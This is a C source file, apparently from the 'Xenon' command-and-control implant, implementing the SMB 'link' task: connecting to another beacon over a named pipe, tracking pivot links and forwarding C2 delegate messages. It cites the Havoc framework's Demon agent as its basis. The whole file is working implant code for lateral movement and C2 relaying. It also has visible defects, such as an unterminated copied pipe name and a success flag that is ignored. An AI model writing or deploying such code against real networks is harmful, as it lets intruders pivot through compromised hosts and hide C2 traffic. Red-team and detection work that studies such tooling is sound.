#include "Tasks/Link.h"

#include "Xenon.h"
#include "Package.h"
#include "Parser.h"
#include "Task.h"
#include "Config.h"

#ifdef INCLUDE_CMD_LINK

/**
 * @brief Link current Beacon to an SMB Beacon.
 * 
 * @ref 
 * @return VOID
 */
VOID Link(PCHAR taskUuid, PPARSER arguments)
{
    // Get command arguments for filepath
    UINT32 nbArg = ParserGetInt32(arguments);
    _dbg("\t Got %d arguments", nbArg);

    if (nbArg == 0)
    {
        return;
    }

    SIZE_T pipeLen      = 0;
	PCHAR  PipeName     = ParserGetString(arguments, &pipeLen);

    _dbg("SMB Link PipeName: %s", PipeName);

    /* Output */
    PVOID outBuf  = NULL;
    SIZE_T outLen = 0;


    /* Connect to Pivot Agent */
    DWORD Result = 0;
    if ( !LinkAdd(PipeName, &outBuf, &outLen) ) 
    {
        _err("Failed to link smb agent.");
        Result = GetLastError();
        PackageError(taskUuid, Result);
        goto END;
    }

    // ( LINK_ADD byte + taskuuid + RESULT byte + Agent2-checkin )
    PPackage locals = PackageInit(LINK_ADD, TRUE);
    PackageAddString(locals, taskUuid, FALSE);
    PackageAddInt32(locals, Result);
    PackageAddString(locals, outBuf, TRUE);

    // Send package
    PARSER Response = { 0 };
    PackageSend(locals, &Response);

    _dbg("LINK RESPONSE BUFFER");
    print_bytes(Response.Buffer, Response.Length);

    /* Now subsequent responses from C2 will contain delegate messages for Link(s) */

END:

    PackageDestroy(locals);
    LocalFree(outBuf);
    if (&Response) ParserDestroy(&Response);

    return;
}

///////////////////////////////////////////////////////////////

/**
 * @brief UnLink current Beacon from an SMB Beacon.
 * 
 * @ref  
 * @return VOID
 */
VOID UnLink(PCHAR taskUuid, PPARSER arguments)
{
    return;
}


/**
 *  Helper Functions
 */



 /**
 * @brief Add a new SMB pivot link to Agent.
 * 
 * @ref Based on Havoc - https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/core/Pivot.c  
 * @return BOOL  
 */
BOOL LinkAdd( PCHAR PipeName, PVOID* outBuf, SIZE_T* outLen )
{
    PLINKS LinkData    = NULL;
    HANDLE hPipe       = NULL;

    _dbg( "Connecting to named pipe: %s\n", PipeName );

    hPipe = CreateFileA( PipeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL );

    if ( hPipe == INVALID_HANDLE_VALUE )
    {
        _err("CreateFileA failed to connect to named pipe. ERROR : %d", GetLastError());
        return FALSE;
    }

    if ( GetLastError() == ERROR_PIPE_BUSY )
    {
        if ( !WaitNamedPipeA(PipeName, 5000) )
        {
            return FALSE;
        }
    }

    do
    {
        // TODO: first get the size then parse
        if ( PeekNamedPipe( hPipe, NULL, 0, NULL, outLen, NULL ) )
        {
            if ( *outLen > 0 )
            {
                _dbg( "outLen => %d\n", *outLen );

                *outBuf = LocalAlloc(LPTR, *outLen);
                memset(*outBuf, 0, *outLen);

                if ( ReadFile( hPipe, *outBuf, *outLen, outLen, NULL ) )
                {
                    _dbg( "outLen Read => %d\n", *outLen );
                    break;
                }
                else
                {
                    _dbg( "ReadFile: Failed[%d]\n", GetLastError() );
                    CloseHandle(hPipe);
                    return FALSE;
                }
            }
        }
        else
        {
            _dbg( "PeekNamedPipe: Failed[%d]\n", GetLastError() );
            CloseHandle(hPipe);
            return FALSE;
        }
    } while ( TRUE );

    // Add this Pivot Link to list
    {
        _dbg("Read %d bytes of data from Link.\n", *outLen);
        

        LinkData                  = LocalAlloc(LPTR, sizeof(LINKS));
        LinkData->hPipe           = hPipe;
        LinkData->Next            = NULL;
        LinkData->LinkId          = PivotParseLinkId(*outBuf, *outLen);

        _dbg("Found Link ID : %x", LinkData->LinkId);

        LinkData->PipeName        = LocalAlloc(LPTR, strlen(PipeName));        // TODO - Check this feels like an issue
        memcpy( LinkData->PipeName, PipeName, strlen(PipeName) );

        _dbg("Set Link \"PipeName\" : %s", LinkData->PipeName);

        if ( !xenonConfig->SmbLinks )
        {
            xenonConfig->SmbLinks = LinkData;
        }
        else
        {
            PLINKS LinksList = xenonConfig->SmbLinks;

            do
            {
                if ( LinksList )
                {
                    if ( LinksList->Next )
                        LinksList = LinksList->Next;

                    else
                    {
                        LinksList->Next = LinkData;
                        break;
                    }
                }
                else break;
            } while ( TRUE );
        }
    }

    return TRUE;
}


BOOL LinkForward( PPARSER delegates )
{
    /** New Packet Format
     * 
     * ( isDelegates? + NumOfDelegates + ( ID + SizeOfMessage + BASE64_MESSAGE ) )
     */
    BOOL   Success          = FALSE;
    UINT32 NumOfDelegates   = ParserGetInt32(delegates);
    
    /* Process all delegate messages */
    for ( INT i = 0; i < NumOfDelegates; i++ )
    {
        SIZE_T  szId     = 0;
        SIZE_T  szMsg    = 0;
        UINT32  LinkId   = ParserGetInt32(delegates);
        PLINKS  TempLink = xenonConfig->SmbLinks;

        _dbg("Got Delegate message with Link ID - %x", LinkId);

        // TODO - create a loop for checking all Links in list
        
        if ( LinkId == TempLink->LinkId )
        {
            SIZE_T sizeOfMsg = ParserGetInt32(delegates);

            _dbg("Delegate message Link ID %x with %d bytes", LinkId, sizeOfMsg);

            if ( !PackageSendPipe(TempLink->hPipe, delegates->Buffer, sizeOfMsg) ) {
                DWORD error = GetLastError();
		        _err("Failed to write data to pipe. ERROR : %d", error);
                goto END;
            }
        }
    }

    Success = TRUE;

END:

    return TRUE;
}


UINT32 PivotParseLinkId( PVOID buffer, SIZE_T size )
{
    PARSER  Parser    = { 0 };
    UINT32  Value     = 0;

    _dbg("Creating new parser object to read buffer");

    ParserNew( &Parser, buffer, size );

    // Value  = ParserStringCopy(&Parser, &uuidLen);
    Value = ParserGetInt32(&Parser);

    _dbg("Parsed SMB Link ID => %x \n", Value);

    ParserDestroy(&Parser);

    return Value;
}



#endif  //INCLUDE_CMD_LINK